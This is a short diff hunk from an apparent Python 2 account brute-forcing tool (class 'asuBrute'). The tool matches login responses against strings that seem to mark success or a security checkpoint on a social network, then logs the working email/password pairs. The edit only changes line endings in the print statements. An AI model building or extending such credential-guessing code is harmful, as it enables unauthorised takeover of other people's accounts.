@@ -42,12 +42,12 @@ class asuBrute(threading.Thread):
 						}
 			).url
 			if "save-device" in self._req or "m_sess" in self._req:
-				print "\r[+] Found     : %s -> %s"%(self._email,
+				print "\n[+] Found     : %s -> %s"%(self._email,
 				self._pasw)
 				_found.append(" | %s -> %s"%(self._email,
 				self._pasw))
 			if "checkpoint" in self._req:
-				print "\r[+] Checkpoint: %s -> %s"%(
+				print "\n[+] Checkpoint: %s -> %s"%(
 				self._email,
 				self._pasw)
 				_cekpoin.append(" - %s - %s"%(self._email,
